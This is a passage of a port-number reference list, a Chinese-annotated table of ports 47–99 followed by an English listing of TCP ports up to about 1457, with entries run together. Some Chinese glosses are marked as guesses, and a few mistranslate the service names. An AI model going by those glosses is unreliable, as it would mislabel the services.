消息处理模块(默认发送口)47　ni-ftp　NI FTP　　　　　　　　　　　　 NI FTP48　auditd　Digital Audit Daemon　　　　　 数码音频后台服务49　tacacs　Login Host Protocol (TACACS)　 TACACS登录主机协议50　re-mail-ck　Remote Mail Checking Protocol　远程邮件检查协议51　la-maint　IMP Logical Address Maintenance　IMP(接口信息处理机)逻辑地址维护52　xns-time　XNS Time Protocol　　　　　　施乐网络服务系统时间协议53　domain　Domain Name Server　　　　　　 域名服务器54　xns-ch　XNS Clearinghouse　　　　　　　施乐网络服务系统票据交换55　isi-gl　ISI Graphics Language　　　　　ISI图形语言56　xns-auth　XNS Authentication　　　　　 施乐网络服务系统验证57　?　any private terminal access　　　　 预留个人用终端访问58　xns-mail　XNS Mail　　　　　　　　　　 施乐网络服务系统邮件59　?　any private file service　　　　　　预留个人文件服务60　?　Unassigned　　　　　　　　　　　　　未定义61　ni-mail　NI MAIL　　　　　　　　　　　 NI邮件?62　acas　ACA Services　　　　　　　　　　 异步通讯适配器服务63　whois+ whois+　　　　　　　　　　　　　 WHOIS+64　covia　Communications Integrator (CI)　通讯接口65　tacacs-ds　TACACS-Database Service　　 TACACS数据库服务66　sqlnet　Oracle?SQLNET　　　　　　　　oracle?SQL*NET67　bootps　Bootstrap Protocol Server　　　引导程序协议服务端68　bootpc　Bootstrap Protocol Client　　　引导程序协议客户端69　tftp　Trivial File Transfer　　　　　　小型文件传输协议70　gopher　Gopher　　　　　　　　　　　　 信息检索协议71　netrjs-1　Remote Job Service　　　　　 远程作业服务72　netrjs-2　Remote Job Service　　　　　 远程作业服务73　netrjs-3　Remote Job Service　　　　　 远程作业服务74　netrjs-4　Remote Job Service　　　　　 远程作业服务75　?　any private dial out service　　　　预留给个人拨出服务76　deos　Distributed External Object Store 分布式外部对象存储77　?　any private RJE service　　　　　　预留给个人远程作业输入服务78　vettcp　vettcp　　　　　　　　　　　　 修正TCP?79　finger　Finger　　　　　　　　　　　　 FINGER(查询远程主机在线用户等信息)80　http　World Wide Web HTTP　　　　　　　全球信息网超文本传输协议81　hosts2-ns　HOSTS2 Name Server　　　　　HOST2名称服务82　xfer　XFER Utility　　　　　　　　　　 传输实用程序83　mit-ml-dev　MIT ML Device　　　　　　　模块化智能终端ML设备84　ctf　Common Trace Facility　　　　　　 公用追踪设备85　mit-ml-dev　MIT ML Device　　　　　　　模块化智能终端ML设备86　mfcobol　Micro Focus Cobol　　　　　　 Micro Focus Cobol编程语言87　?　any private terminal link　　　　　 预留给个人终端连接88　kerberos　Kerberos　　　　　　　　　　 Kerberros安全认证系统89　su-mit-tg　SU&#x2F;MIT Telnet Gateway　　　 SU&#x2F;MIT终端仿真网关90　dnsix　DNSIX Securit Attribute Token Map　DNSIX 安全属性标记图91　mit-dov　MIT Dover Spooler　　　　　　 MIT Dover假脱机92　npp　Network Printing Protocol　　　　 网络打印协议93　dcp　Device Control Protocol　　　　　 设备控制协议94　objcall　Tivoli Object Dispatcher　　　Tivoli对象调度95　supdup　SUPDUP96　dixie　DIXIE Protocol Specification　　DIXIE协议规范97　Swift-rvf　swift?Remote Virtural File Protocol　快速远程虚拟文件协议98　tacnews　TAC News　　　　　　　　　　　TAC(东京大学自动计算机?)新闻协议99　metagram　Metagram Relay\n101&#x2F;tcp hostname NIC Host Name Server102&#x2F;tcp iso-tsap ISO-TSAP Class 0103&#x2F;tcp gppitnp Genesis Point-to-Point Trans Net104&#x2F;tcp acr-nema ACR-NEMA Digital Imag. &amp; Comm. 300105&#x2F;tcp cso CCSO name server protocol105&#x2F;tcp csnet-ns Mailbox Name Nameserver106&#x2F;tcp 3com-tsmux 3COM-TSMUX107&#x2F;tcp rtelnet Remote Telnet Service108&#x2F;tcp snagas SNA Gateway Access Server109&#x2F;tcp pop2 Post Office Protocol - Version 2110&#x2F;tcp pop3 Post Office Protocol - Version 3111&#x2F;tcp sunrpc SUN Remote Procedure Call112&#x2F;tcp mcidas McIDAS Data Transmission Protocol113&#x2F;tcp ident114&#x2F;tcp audionews Audio News Multicast115&#x2F;tcp sftp Simple File Transfer Protocol116&#x2F;tcp ansanotify ANSA REX Notify117&#x2F;tcp uucp-path UUCP Path Service118&#x2F;tcp sqlserv SQL Services119&#x2F;tcp nntp Network News Transfer Protocol120&#x2F;tcp cfdptkt CFDPTKT121&#x2F;tcp erpc Encore Expedited Remote Pro.Call122&#x2F;tcp smakynet SMAKYNET123&#x2F;tcp ntp Network Time Protocol124&#x2F;tcp ansatrader ANSA REX Trader125&#x2F;tcp locus-map Locus PC-Interface Net Map Ser126&#x2F;tcp unitary Unisys Unitary Login127&#x2F;tcp locus-con Locus PC-Interface Conn Server128&#x2F;tcp gss-xlicen GSS X License Verification129&#x2F;tcp pwdgen Password Generator Protocol130&#x2F;tcp cisco-fna cisco FNATIVE131&#x2F;tcp cisco-tna cisco TNATIVE132&#x2F;tcp cisco-sys cisco SYSMAINT133&#x2F;tcp statsrv Statistics Service134&#x2F;tcp ingres-net INGRES-NET Service135&#x2F;tcp epmap DCE endpoint resolution136&#x2F;tcp profile PROFILE Naming System137&#x2F;tcp netbios-ns NETBIOS Name Service138&#x2F;tcp netbios-dgm NETBIOS Datagram Service139&#x2F;tcp netbios-ssn NETBIOS Session Service140&#x2F;tcp emfis-data EMFIS Data Service141&#x2F;tcp emfis-cntl EMFIS Control Service142&#x2F;tcp bl-idm Britton-Lee IDM143&#x2F;tcp imap Internet Message Access Protocol144&#x2F;tcp uma Universal Management Architecture145&#x2F;tcp uaac UAAC Protocol146&#x2F;tcp iso-tp0 ISO-IP0147&#x2F;tcp iso-ip ISO-IP148&#x2F;tcp jargon Jargon149&#x2F;tcp aed-512 AED 512 Emulation Service150&#x2F;tcp sql-net SQL-NET151&#x2F;tcp hems HEMS152&#x2F;tcp bftp Background File Transfer Program153&#x2F;tcp sgmp SGMP154&#x2F;tcp netsc-prod NETSC155&#x2F;tcp netsc-dev NETSC156&#x2F;tcp sqlsrv SQL Service157&#x2F;tcp knet-cmp KNET&#x2F;VM Command&#x2F;Message Protocol158&#x2F;tcp pcmail-srv PCMail Server159&#x2F;tcp nss-routing NSS-Routing160&#x2F;tcp sgmp-traps SGMP-TRAPS161&#x2F;tcp snmp SNMP162&#x2F;tcp snmptrap SNMPTRAP163&#x2F;tcp cmip-man CMIP&#x2F;TCP Manager164&#x2F;tcp cmip-agent CMIP&#x2F;TCP Agent165&#x2F;tcp xns-courier Xerox166&#x2F;tcp s-net Sirius Systems167&#x2F;tcp namp NAMP168&#x2F;tcp rsvd RSVD169&#x2F;tcp send SEND170&#x2F;tcp print-srv Network PostScript171&#x2F;tcp multiplex Network Innovations Multiplex172&#x2F;tcp cl&#x2F;1 Network Innovations CL&#x2F;1173&#x2F;tcp xyplex-mux Xyplex174&#x2F;tcp mailq MAILQ175&#x2F;tcp vmnet VMNET176&#x2F;tcp genrad-mux GENRAD-MUX177&#x2F;tcp xdmcp X Display Manager Control Protocol178&#x2F;tcp nextstep NextStep Window Server179&#x2F;tcp bgp Border Gateway Protocol180&#x2F;tcp ris Intergraph181&#x2F;tcp unify Unify182&#x2F;tcp audit Unisys Audit SITP183&#x2F;tcp ocbinder OCBinder184&#x2F;tcp ocserver OCServer185&#x2F;tcp remote-kis Remote-KIS186&#x2F;tcp kis KIS Protocol187&#x2F;tcp aci Application Communication Interface188&#x2F;tcp mumps Plus Five‘s MUMPS189&#x2F;tcp qft Queued File Transport190&#x2F;tcp gacp Gateway Access Control Protocol191&#x2F;tcp prospero Prospero Directory Service192&#x2F;tcp osu-nms OSU Network Monitoring System193&#x2F;tcp srmp Spider Remote Monitoring Protocol194&#x2F;tcp irc Internet Relay Chat Protocol195&#x2F;tcp dn6-nlm-aud DNSIX Network Level Module Audit196&#x2F;tcp dn6-smm-red DNSIX Session Mgt Module Audit Redir197&#x2F;tcp dls Directory Location Service198&#x2F;tcp dls-mon Directory Location Service Monitor199&#x2F;tcp smux SMUX200&#x2F;tcp src IBM System Resource Controller201&#x2F;tcp at-rtmp AppleTalk Routing Maintenance202&#x2F;tcp at-nbp AppleTalk Name Binding203&#x2F;tcp at-3 AppleTalk Unused204&#x2F;tcp at-echo AppleTalk Echo205&#x2F;tcp at-5 AppleTalk Unused206&#x2F;tcp at-zis AppleTalk Zone Information207&#x2F;tcp at-7 AppleTalk Unused208&#x2F;tcp at-8 AppleTalk Unused209&#x2F;tcp qmtp The Quick Mail Transfer Protocol210&#x2F;tcp z39.50 ANSI Z39.50211&#x2F;tcp 914c&#x2F;g Texas Instruments 914C&#x2F;G Terminal212&#x2F;tcp anet ATEXSSTR214&#x2F;tcp vmpwscs VM PWSCS215&#x2F;tcp softpc Insignia Solutions216&#x2F;tcp CAIlic Computer Associates Int‘l License Server217&#x2F;tcp dbase dBASE Unix218&#x2F;tcp mpp Netix Message Posting Protocol219&#x2F;tcp uarps Unisys ARPs220&#x2F;tcp imap3 Interactive Mail Access Protocol v3221&#x2F;tcp fln-spx Berkeley rlogind with SPX auth222&#x2F;tcp rsh-spx Berkeley rshd with SPX auth223&#x2F;tcp cdc Certificate Distribution Center242&#x2F;tcp direct Direct243&#x2F;tcp sur-meas Survey Measurement244&#x2F;tcp dayna Dayna245&#x2F;tcp link LINK246&#x2F;tcp dsp3270 Display Systems Protocol247&#x2F;tcp subntbcst_tftp SUBNTBCST_TFTP248&#x2F;tcp bhfhs bhfhs256&#x2F;tcp rap RAP257&#x2F;tcp set Secure Electronic Transaction258&#x2F;tcp yak-chat Yak Winsock Personal Chat259&#x2F;tcp esro-gen Efficient Short Remote Operations260&#x2F;tcp openport Openport263&#x2F;tcp hdap HDAP264&#x2F;tcp bgmp BGMP280&#x2F;tcp http-mgmt http-mgmt309&#x2F;tcp entrusttime EntrustTime310&#x2F;tcp bhmds bhmds312&#x2F;tcp vslmp VSLMP315&#x2F;tcp dpsi DPSI316&#x2F;tcp decauth decAuth317&#x2F;tcp zannet Zannet321&#x2F;tcp pip PIP344&#x2F;tcp pdap Prospero Data Access Protocol345&#x2F;tcp pawserv Perf Analysis Workbench346&#x2F;tcp zserv Zebra server347&#x2F;tcp fatserv Fatmen Server348&#x2F;tcp csi-sgwp Cabletron Management Protocol349&#x2F;tcp mftp mftp351&#x2F;tcp matip-type-b MATIP Type B351&#x2F;tcp bhoetty bhoetty (added 5&#x2F;21&#x2F;97)353&#x2F;tcp ndsauth NDSAUTH354&#x2F;tcp bh611 bh611357&#x2F;tcp bhevent bhevent362&#x2F;tcp srssend SRS Send365&#x2F;tcp dtk DTK366&#x2F;tcp odmr ODMR368&#x2F;tcp qbikgdp QbikGDP371&#x2F;tcp clearcase Clearcase372&#x2F;tcp ulistproc ListProcessor373&#x2F;tcp legent-1 Legent Corporation374&#x2F;tcp legent-2374&#x2F;tcp legent-2 Legent Corporation375&#x2F;tcp hassle Hassle376&#x2F;tcp nip Amiga Envoy Network Inquiry Proto377&#x2F;tcp tnETOS NEC Corporation378&#x2F;tcp dsETOS NEC Corporation379&#x2F;tcp is99c TIA&#x2F;EIA&#x2F;IS-99 modem client380&#x2F;tcp is99s TIA&#x2F;EIA&#x2F;IS-99 modem server381&#x2F;tcp hp-collector hp performance data collector383&#x2F;tcp hp-alarm-mgr hp performance data alarm manager384&#x2F;tcp arns A Remote Network Server System385&#x2F;tcp ibm-app IBM Application386&#x2F;tcp asa ASA Message Router Object Def.387&#x2F;tcp aurp Appletalk Update-Based Routing Pro.388&#x2F;tcp unidata-ldm Unidata LDM Version 4389&#x2F;tcp ldap Lightweight Directory Access Protocol390&#x2F;tcp uis UIS391&#x2F;tcp synotics-relay SynOptics SNMP Relay Port393&#x2F;tcp dis Data Interpretation System394&#x2F;tcp embl-ndt EMBL Nucleic Data Transfer395&#x2F;tcp netcp NETscout Control Protocol396&#x2F;tcp netware-ip Novell Netware over IP397&#x2F;tcp mptn Multi Protocol Trans. Net.398&#x2F;tcp kryptolan Kryptolan399&#x2F;tcp iso-tsap-c2 ISO Transport Class 2 Non-Control over TCP400&#x2F;tcp work-sol Workstation Solutions401&#x2F;tcp ups Uninterruptible Power Supply402&#x2F;tcp genie Genie Protocol403&#x2F;tcp decap decap404&#x2F;tcp nced nced405&#x2F;tcp ncld ncld406&#x2F;tcp imsp Interactive Mail Support Protocol407&#x2F;tcp timbuktu Timbuktu408&#x2F;tcp prm-sm Prospero Resource Manager Sys. Man.409&#x2F;tcp prm-nm Prospero Resource Manager Node Man.410&#x2F;tcp decladebug DECLadebug Remote Debug Protocol411&#x2F;tcp rmt Remote MT Protocol412&#x2F;tcp synoptics-trap Trap Convention Port413&#x2F;tcp smsp SMSP414&#x2F;tcp infoseek InfoSeek415&#x2F;tcp bnet BNet416&#x2F;tcp silverplatter Silverplatter417&#x2F;tcp onmux Onmux418&#x2F;tcp hyper-g Hyper-G419&#x2F;tcp ariel1 Ariel420&#x2F;tcp smpte SMPTE421&#x2F;tcp ariel2 Ariel422&#x2F;tcp ariel3 Ariel423&#x2F;tcp opc-job-start IBM Operations Planning and Control Start424&#x2F;tcp opc-job-track IBM Operations Planning and Control Track425&#x2F;tcp icad-el ICAD426&#x2F;tcp smartsdp smartsdp427&#x2F;tcp svrloc Server Location428&#x2F;tcp ocs_cmu OCS_CMU429&#x2F;tcp ocs_amu OCS_AMU430&#x2F;tcp utmpsd UTMPSD431&#x2F;tcp utmpcd UTMPCD432&#x2F;tcp iasd IASD433&#x2F;tcp nnsp NNSP434&#x2F;tcp mobileip-agent MobileIP-Agent435&#x2F;tcp mobilip-mn MobilIP-MN436&#x2F;tcp dna-cml DNA-CML437&#x2F;tcp comscm comscm438&#x2F;tcp dsfgw dsfgw439&#x2F;tcp dasp dasp Thomas Obermair440&#x2F;tcp sgcp sgcp441&#x2F;tcp decvms-sysmgt decvms-sysmgt442&#x2F;tcp cvc_hostd cvc_hostd443&#x2F;tcp https http protocol over TLS&#x2F;SSL444&#x2F;tcp snpp Simple Network Paging Protocol445&#x2F;tcp microsoft-ds Microsoft-DS446&#x2F;tcp ddm-rdb DDM-RDB447&#x2F;tcp ddm-dfm DDM-RFM448&#x2F;tcp ddm-ssl DDM-SSL449&#x2F;tcp as-servermap AS Server Mapper450&#x2F;tcp tserver TServer451&#x2F;tcp sfs-smp-net Cray Network Semaphore server453&#x2F;tcp creativeserver CreativeServer454&#x2F;tcp contentserver ContentServer455&#x2F;tcp creativepartnr CreativePartnr456&#x2F;tcp macon-tcp macon-tcp457&#x2F;tcp scohelp scohelp458&#x2F;tcp appleqtc apple quick time459&#x2F;tcp ampr-rcmd ampr-rcmd460&#x2F;tcp skronk skronk461&#x2F;tcp datasurfsrv DataRampSrv462&#x2F;tcp datasurfsrvsec DataRampSrvSec463&#x2F;tcp alpes alpes464&#x2F;tcp kpasswd kpasswd465&#x2F;tcp smtps smtp protocol over TLS&#x2F;SSL (was ssmtp)466&#x2F;tcp digital-vrc digital-vrc467&#x2F;tcp mylex-mapd mylex-mapd468&#x2F;tcp photuris proturis469&#x2F;tcp rcp Radio Control Protocol470&#x2F;tcp scx-proxy scx-proxy471&#x2F;tcp mondex Mondex472&#x2F;tcp ljk-login ljk-login473&#x2F;tcp hybrid-pop hybrid-pop474&#x2F;tcp tn-tl-w1 tn-tl-w1475&#x2F;tcp tcpnethaspsrv tcpnethaspsrv476&#x2F;tcp tn-tl-fd1 tn-tl-fd1477&#x2F;tcp ss7ns ss7ns478&#x2F;tcp spsc spsc479&#x2F;tcp iafserver iafserver480&#x2F;tcp iafdbase iafdbase481&#x2F;tcp ph Ph service482&#x2F;tcp bgs-nsi bgs-nsi483&#x2F;tcp ulpnet ulpnet484&#x2F;tcp integra-sme Integra Software Management Environment485&#x2F;tcp powerburst Air Soft Power Burst486&#x2F;tcp avian avian487&#x2F;tcp saft saft Simple Asynchronous File Transfer488&#x2F;tcp gss-http gss-http489&#x2F;tcp nest-protocol nest-protocol490&#x2F;tcp micom-pfs micom-pfs491&#x2F;tcp?Go-login?go-login492&#x2F;tcp ticf-1 Transport Independent Convergence for FNA493&#x2F;tcp ticf-2 Transport Independent Convergence for FNA494&#x2F;tcp pov-ray POV-Ray495&#x2F;tcp intecourier intecourier496&#x2F;tcp pim-rp-disc PIM-RP-DISC497&#x2F;tcp dantz dantz498&#x2F;tcp siam siam499&#x2F;tcp iso-ill ISO ILL Protocol500&#x2F;tcp isakmp isakmp501&#x2F;tcp stmf STMF502&#x2F;tcp asa-appl-proto asa-appl-proto503&#x2F;tcp intrinsa Intrinsa504&#x2F;tcp citadel citadel505&#x2F;tcp mailbox-lm mailbox-lm506&#x2F;tcp ohimsrv ohimsrv507&#x2F;tcp crs crs508&#x2F;tcp xvttp xvttp509&#x2F;tcp snare snare510&#x2F;tcp fcp FirstClass Protocol511&#x2F;tcp passgo PassGo512&#x2F;tcp exec remote process execution;513&#x2F;tcp login remote login a la telnet;514&#x2F;tcp shell cmd515&#x2F;tcp printer spooler516&#x2F;tcp videotex videotex517&#x2F;tcp talk like tenex link, but across518&#x2F;tcp ntalk519&#x2F;tcp utime unixtime520&#x2F;tcp efs extended file name server521&#x2F;tcp ripng ripng522&#x2F;tcp ulp ULP523&#x2F;tcp ibm-db2 IBM-DB2524&#x2F;tcp ncp NCP525&#x2F;tcp timed timeserver526&#x2F;tcp tempo newdate527&#x2F;tcp stx Stock IXChange528&#x2F;tcp custix Customer IXChange529&#x2F;tcp irc-serv IRC-SERV530&#x2F;tcp courier rpc531&#x2F;tcp conference chat532&#x2F;tcp netnews readnews533&#x2F;tcp netwall for emergency broadcasts534&#x2F;tcp mm-admin MegaMedia Admin535&#x2F;tcp iiop iiop536&#x2F;tcp opalis-rdv opalis-rdv537&#x2F;tcp nmsp Networked Media Streaming Protocol538&#x2F;tcp gdomap gdomap539&#x2F;tcp apertus-ldp Apertus Technologies Load Determination540&#x2F;tcp uucp uucpd541&#x2F;tcp uucp-rlogin uucp-rlogin542&#x2F;tcp commerce commerce543&#x2F;tcp klogin544&#x2F;tcp kshell krcmd545&#x2F;tcp appleqtcsrvr appleqtcsrvr546&#x2F;tcp dhcpv6-client DHCPv6 Client547&#x2F;tcp dhcpv6-server DHCPv6 Server548&#x2F;tcp afpovertcp AFP over TCP549&#x2F;tcp idfp IDFP550&#x2F;tcp new-rwho new-who551&#x2F;tcp cybercash cybercash552&#x2F;tcp deviceshare deviceshare553&#x2F;tcp pirp pirp554&#x2F;tcp rtsp Real Time Stream Control Protocol555&#x2F;tcp dsf556&#x2F;tcp remotefs rfs server557&#x2F;tcp openvms-sysipc openvms-sysipc558&#x2F;tcp sdnskmp SDNSKMP559&#x2F;tcp teedtap TEEDTAP560&#x2F;tcp rmonitor rmonitord561&#x2F;tcp monitor562&#x2F;tcp chshell chcmd563&#x2F;tcp nntps nntp protocol over TLS&#x2F;SSL (was snntp)564&#x2F;tcp 9pfs plan 9 file service565&#x2F;tcp whoami whoami566&#x2F;tcp streettalk streettalk567&#x2F;tcp banyan-rpc banyan-rpc568&#x2F;tcp ms-shuttle microsoft shuttle569&#x2F;tcp ms-rome microsoft rome570&#x2F;tcp meter demon571&#x2F;tcp meter udemon572&#x2F;tcp sonar sonar573&#x2F;tcp banyan-vip banyan-vip574&#x2F;tcp ftp-agent FTP Software Agent System575&#x2F;tcp vemmi VEMMI576&#x2F;tcp ipcd ipcd577&#x2F;tcp vnas vnas578&#x2F;tcp ipdd ipdd579&#x2F;tcp decbsrv decbsrv581&#x2F;tcp bdp Bundle Discovery Protocol588&#x2F;tcp cal CAL589&#x2F;tcp eyelink EyeLink590&#x2F;tcp tns-cml TNS CML593&#x2F;tcp http-rpc-epmap HTTP RPC Ep Map594&#x2F;tcp tpip TPIP596&#x2F;tcp smsd SMSD599&#x2F;tcp acp Aeolon Core Protocol600&#x2F;tcp ipcserver Sun IPC server606&#x2F;tcp urm Cray Unified Resource Manager607&#x2F;tcp nqs nqs608&#x2F;tcp sift-uft Sender-Initiated&#x2F;Unsolicited File Transfer609&#x2F;tcp npmp-trap npmp-trap610&#x2F;tcp npmp-local npmp-local611&#x2F;tcp npmp-gui npmp-gui613&#x2F;tcp hmmp-op HMMP Operation620&#x2F;tcp sco-websrvrmgr SCO WebServer Manager621&#x2F;tcp escp-ip ESCP625&#x2F;tcp dec_dlm DEC DLM626&#x2F;tcp asia ASIA628&#x2F;tcp qmqp QMQP630&#x2F;tcp rda RDA631&#x2F;tcp ipp IPP (Internet Printing Protocol)632&#x2F;tcp bmpp bmpp634&#x2F;tcp ginad ginad635&#x2F;tcp rlzdbase RLZ DBase636&#x2F;tcp ldaps ldap protocol over TLS&#x2F;SSL (was sldap)637&#x2F;tcp lanserver lanserver639&#x2F;tcp msdp MSDP666&#x2F;tcp doom doom Id Software667&#x2F;tcp disclose campaign contribution disclosures - SDR Technologies668&#x2F;tcp mecomm MeComm669&#x2F;tcp meregister MeRegister670&#x2F;tcp vacdsm-sws VACDSM-SWS671&#x2F;tcp vacdsm-app VACDSM-APP672&#x2F;tcp vpps-qua VPPS-QUA673&#x2F;tcp cimplex CIMPLEX674&#x2F;tcp acap ACAP675&#x2F;tcp dctp DCTP704&#x2F;tcp elcsd errlog copy&#x2F;server daemon705&#x2F;tcp agentx AgentX709&#x2F;tcp entrust-kmsh Entrust Key Management Service Handler710&#x2F;tcp entrust-ash Entrust Administration Service Handler729&#x2F;tcp netviewdm1 IBM NetView DM&#x2F;6000 Server&#x2F;Client730&#x2F;tcp netviewdm2 IBM NetView DM&#x2F;6000 send&#x2F;tcp731&#x2F;tcp netviewdm3 IBM NetView DM&#x2F;6000 receive&#x2F;tcp741&#x2F;tcp netgw netGW742&#x2F;tcp netrcs Network based Rev. Cont. Sys.744&#x2F;tcp flexlm Flexible License Manager747&#x2F;tcp fujitsu-dev Fujitsu Device Control748&#x2F;tcp ris-cm Russell Info Sci Calendar Manager749&#x2F;tcp kerberos-adm kerberos administration750&#x2F;tcp rfile751&#x2F;tcp pump752&#x2F;tcp qrh753&#x2F;tcp rrh754&#x2F;tcp tell send758&#x2F;tcp nlogin759&#x2F;tcp con760&#x2F;tcp ns761&#x2F;tcp rxe762&#x2F;tcp quotad763&#x2F;tcp cycleserv764&#x2F;tcp omserv765&#x2F;tcp webster769&#x2F;tcp vid770&#x2F;tcp cadlock771&#x2F;tcp rtip772&#x2F;tcp cycleserv2773&#x2F;tcp submit774&#x2F;tcp rpasswd776&#x2F;tcp wpages780&#x2F;tcp wpgs786&#x2F;tcp concert Concert787&#x2F;tcp qsc QSC801&#x2F;tcp device873&#x2F;tcp rsync rsync886&#x2F;tcp iclcnet-locate ICL coNETion locate server887&#x2F;tcp iclcnet_svinfo ICL coNETion server info888&#x2F;tcp accessbuilder AccessBuilder900&#x2F;tcp omginitialrefs OMG Initial Refs911&#x2F;tcp xact-backup xact-backup990&#x2F;tcp ftps ftp protocol, control, over TLS&#x2F;SSL991&#x2F;tcp nas Netnews Administration System992&#x2F;tcp telnets telnet protocol over TLS&#x2F;SSL993&#x2F;tcp imaps imap4 protocol over TLS&#x2F;SSL994&#x2F;tcp ircs irc protocol over TLS&#x2F;SSL995&#x2F;tcp pop3s pop3 protocol over TLS&#x2F;SSL (was spop3)996&#x2F;tcp vsinet vsinet997&#x2F;tcp maitrd998&#x2F;tcp busboy999&#x2F;tcp garcon1000&#x2F;tcp cadlock1010&#x2F;tcp surf surf1023&#x2F;tcp Reserved Reserved1030&#x2F;tcp iad1 BBN IAD1031&#x2F;tcp iad2 BBN IAD1032&#x2F;tcp iad3 BBN IAD1047&#x2F;tcp neod1 Sun‘s NEO Object Request Broker1048&#x2F;tcp neod2 Sun‘s NEO Object Request Broker1058&#x2F;tcp nim nim1059&#x2F;tcp nimreg nimreg1067&#x2F;tcp instl_boots Installation Bootstrap Proto. Serv.1068&#x2F;tcp instl_bootc Installation Bootstrap Proto. Cli.1080&#x2F;tcp socks Socks1083&#x2F;tcp ansoft-lm-1 Anasoft License Manager1084&#x2F;tcp ansoft-lm-2 Anasoft License Manager1123&#x2F;tcp murray Murray1155&#x2F;tcp nfa Network File Access1212&#x2F;tcp lupa lupa1222&#x2F;tcp nerv SNI R&amp;D network1239&#x2F;tcp nmsd NMSD1248&#x2F;tcp hermes1313&#x2F;tcp bmc_patroldb BMC_PATROLDB1314&#x2F;tcp pdps Photoscript Distributed Printing System1321&#x2F;tcp pip PIP1345&#x2F;tcp vpjp VPJP1346&#x2F;tcp alta-ana-lm Alta Analytics License Manager1347&#x2F;tcp bbn-mmc multi media conferencing1348&#x2F;tcp bbn-mmx multi media conferencing1349&#x2F;tcp sbook Registration Network Protocol1350&#x2F;tcp editbench Registration Network Protocol1352&#x2F;tcp lotusnote Lotus Note1353&#x2F;tcp relief Relief Consulting1354&#x2F;tcp rightbrain RightBrain Software1355&#x2F;tcp intuitive-edge Intuitive Edge1356&#x2F;tcp cuillamartin CuillaMartin Company1357&#x2F;tcp pegboard Electronic PegBoard1358&#x2F;tcp connlcli CONNLCLI1359&#x2F;tcp ftsrv FTSRV1360&#x2F;tcp mimer MIMER1361&#x2F;tcp linx LinX1362&#x2F;tcp timeflies TimeFlies1363&#x2F;tcp ndm-requester Network DataMover Requester1364&#x2F;tcp ndm-server Network DataMover Server1365&#x2F;tcp adapt-sna Network Software Associates1366&#x2F;tcp netware-csp Novell NetWare Comm Service Platform1367&#x2F;tcp dcs DCS1368&#x2F;tcp screencast ScreenCast1369&#x2F;tcp gv-us GlobalView to Unix Shell1370&#x2F;tcp us-gv Unix Shell to GlobalView1371&#x2F;tcp fc-cli Fujitsu Config Protocol1372&#x2F;tcp fc-ser Fujitsu Config Protocol1373&#x2F;tcp chromagrafx Chromagrafx1374&#x2F;tcp molly EPI Software Systems1375&#x2F;tcp bytex Bytex1376&#x2F;tcp ibm-pps IBM Person to Person Software1377&#x2F;tcp cichlid Cichlid License Manager1378&#x2F;tcp elan Elan License Manager1379&#x2F;tcp dbreporter Integrity Solutions1380&#x2F;tcp telesis-licman Telesis Network License Manager1381&#x2F;tcp apple-licman Apple Network License Manager1382&#x2F;tcp udt_os1383&#x2F;tcp gwha GW Hannaway Network License Manager1384&#x2F;tcp os-licman Objective Solutions License Manager1385&#x2F;tcp atex_elmd Atex Publishing License Manager1386&#x2F;tcp checksum CheckSum License Manager1387&#x2F;tcp cadsi-lm Computer Aided Design Software Inc LM1388&#x2F;tcp objective-dbc Objective Solutions DataBase Cache1389&#x2F;tcp iclpv-dm Document Manager1390&#x2F;tcp iclpv-sc Storage Controller1391&#x2F;tcp iclpv-sas Storage Access Server1392&#x2F;tcp iclpv-pm Print Manager1393&#x2F;tcp iclpv-nls Network Log Server1394&#x2F;tcp iclpv-nlc Network Log Client1395&#x2F;tcp iclpv-wsm PC Workstation Manager software1396&#x2F;tcp dvl-activemail DVL Active Mail1399&#x2F;tcp cadkey-licman Cadkey License Manager1400&#x2F;tcp cadkey-tablet Cadkey Tablet Daemon1402&#x2F;tcp prm-sm-np Prospero Resource Manager1403&#x2F;tcp prm-nm-np Prospero Resource Manager1404&#x2F;tcp igi-lm Infinite Graphics License Manager1405&#x2F;tcp ibm-res IBM Remote Execution Starter1406&#x2F;tcp netlabs-lm NetLabs License Manager1407&#x2F;tcp dbsa-lm DBSA License Manager1408&#x2F;tcp sophia-lm Sophia License Manager1409&#x2F;tcp here-lm Here License Manager1410&#x2F;tcp hiq HiQ License Manager1411&#x2F;tcp af AudioFile1412&#x2F;tcp innosys InnoSys1413&#x2F;tcp innosys-acl Innosys-ACL1414&#x2F;tcp ibm-mqseries IBM MQSeries1415&#x2F;tcp dbstar DBStar1416&#x2F;tcp novell-lu6.2 Novell LU6.21417&#x2F;tcp timbuktu-srv1 Timbuktu Service 1 Port1418&#x2F;tcp timbuktu-srv2 Timbuktu Service 2 Port1419&#x2F;tcp timbuktu-srv3 Timbuktu Service 3 Port1420&#x2F;tcp timbuktu-srv4 Timbuktu Service 4 Port1421&#x2F;tcp gandalf-lm Gandalf License Manager1422&#x2F;tcp autodesk-lm Autodesk License Manager1423&#x2F;tcp essbase Essbase Arbor Software1424&#x2F;tcp hybrid Hybrid Encryption Protocol1425&#x2F;tcp zion-lm Zion Software License Manager1426&#x2F;tcp sais Satellite-data Acquisition System 11427&#x2F;tcp mloadd mloadd monitoring tool1428&#x2F;tcp informatik-lm Informatik License Manager1429&#x2F;tcp nms Hypercom NMS1430&#x2F;tcp tpdu Hypercom TPDU1431&#x2F;tcp rgtp Reverse Gossip Transport1432&#x2F;tcp blueberry-lm Blueberry Software License Manager1433&#x2F;tcp ms-sql-s Microsoft-SQL-Server1434&#x2F;tcp ms-sql-m Microsoft-SQL-Monitor1435&#x2F;tcp ibm-cics IBM CICS1436&#x2F;tcp saism Satellite-data Acquisition System 21437&#x2F;tcp tabula Tabula1438&#x2F;tcp eicon-server Eicon Security Agent&#x2F;Server1439&#x2F;tcp eicon-x25 Eicon X25&#x2F;SNA Gateway1440&#x2F;tcp eicon-slp Eicon Service Location Protocol1441&#x2F;tcp cadis-1 Cadis License Management1442&#x2F;tcp cadis-2 Cadis License Management1443&#x2F;tcp ies-lm Integrated Engineering Software1444&#x2F;tcp marcam-lm Marcam License Management1445&#x2F;tcp proxima-lm Proxima License Manager1446&#x2F;tcp ora-lm Optical Research Associates License Manager1447&#x2F;tcp apri-lm Applied Parallel Research LM1448&#x2F;tcp oc-lm OpenConnect License Manager1449&#x2F;tcp peport PEport1450&#x2F;tcp dwf Tandem Distributed Workbench Facility1451&#x2F;tcp infoman IBM Information Management1452&#x2F;tcp gtegsc-lm GTE Government Systems License Man1453&#x2F;tcp genie-lm Genie License Manager1454&#x2F;tcp interhdl_elmd interHDL License Manager1455&#x2F;tcp esl-lm ESL License Manager1456&#x2F;tcp dca DCA1457&#x2F;tcp valisys-lm Valisys License 